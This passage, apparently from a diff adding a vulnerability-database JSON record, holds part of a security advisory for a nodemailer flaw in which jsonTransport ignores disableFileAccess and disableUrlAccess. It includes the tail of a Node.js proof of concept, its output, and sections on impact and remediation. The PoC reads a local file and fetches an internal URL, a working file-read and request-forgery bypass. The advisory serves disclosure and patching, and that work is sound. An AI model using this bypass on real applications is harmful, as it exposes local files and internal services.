console.log('STREAM_FILE_CONTROL=' + err.code);\n  }\n\n  const server = http.createServer((req, res) => {\n    console.log('LOCAL_HTTP_REQUEST=' + req.method + ' ' + req.url);\n    res.end('LOCAL_HTTP_MARKER');\n  });\n  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));\n  const url = 'http://127.0.0.1:' + server.address().port + '/private';\n  const jsonUrlInfo = await sendMail(jsonTransport, {\n    from: 'sender@example.test',\n    to: 'recipient@example.test',\n    subject: 'json url bypass',\n    text: { href: url }\n  });\n  const jsonUrlMessage = JSON.parse(jsonUrlInfo.message);\n  console.log('JSON_URL_BYPASS=' + (jsonUrlMessage.text === 'LOCAL_HTTP_MARKER'));\n  const streamUrlTransport = nodemailer.createTransport({ streamTransport: true, buffer: true, disableUrlAccess: true });\n  try {\n    await sendMail(streamUrlTransport, {\n      from: 'sender@example.test',\n      to: 'recipient@example.test',\n      subject: 'stream url control',\n      text: { href: url }\n    });\n    console.log('STREAM_URL_CONTROL=NO_ERROR');\n  } catch (err) {\n    console.log('STREAM_URL_CONTROL=' + err.code);\n  }\n  server.close();\n  fs.unlinkSync(fixture);\n})().catch(err => { try { fs.unlinkSync(fixture); } catch (E) {} console.error(err && err.stack || err); process.exit(1); });\nNODE\n```\n\nObserved output in this environment:\n\n```text\nJSON_FILE_BYPASS=true\nJSON_FILE_CONTENT=NM_JSON_BYPASS_1779802076150\nSTREAM_FILE_CONTROL=EFILEACCESS\nLOCAL_HTTP_REQUEST=GET /private\nJSON_URL_BYPASS=true\nSTREAM_URL_CONTROL=EURLACCESS\n```\n\nExpected vulnerable output: `JSON_FILE_BYPASS=true`, the printed temporary marker in `JSON_FILE_CONTENT`, a `LOCAL_HTTP_REQUEST=GET /private` line, and `JSON_URL_BYPASS=true`. Expected negative/control output: `STREAM_FILE_CONTROL=EFILEACCESS` and `STREAM_URL_CONTROL=EURLACCESS`, showing the same policy flags work in the normal streaming transport.\n\nCleanup: the PoC removes its temporary fixture file before exiting and closes the local HTTP server.\n\n### Impact\n\nIf an application uses `jsonTransport` to safely serialize or queue partially user-controlled Nodemailer message objects while relying on `disableFileAccess` / `disableUrlAccess`, an attacker can bypass those protections. The file-read variant can copy local file contents into the generated JSON message output. The URL-fetch variant can force outbound HTTP requests from the application host to local or internal services despite URL access being disabled. The impact depends on what message fields the embedding application exposes and where it stores or returns the generated JSON, but the local PoC confirms both protected sink operations are reached.\n\n### Suggested remediation\n\nEnforce `disableFileAccess` and `disableUrlAccess` inside `shared.resolveContent()` or pass an explicit policy object into every pre-resolution call and reject protected `path` / `href` values before opening files or fetching URLs. Apply the same fix to `jsonTransport` normalization and the `attachDataUrls` pre-plugin path. Add regression tests showing `jsonTransport` returns `EFILEACCESS` / `EURLACCESS` for file and URL content when those flags are set, and that `attachDataUrls` cannot resolve object-form `html.path` / `html.href` when the corresponding access flag is disabled.",
+      "aliases": [
+        "CVE-2026-82660"
+      ],
+      "modified": "2026-09-10T03:50:51.064517834Z",
+      "published": "2026-06-15T17:35:10Z",
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-862"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-15T17:35:10Z",
+        "nvd_published_at": null
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-wqvq-jvpq-h66f"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "8.0.9"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.0.8",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-wqvq-jvpq-h66f/GHSA-wqvq-jvpq-h66f.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ]
+    }
+  ]
+}
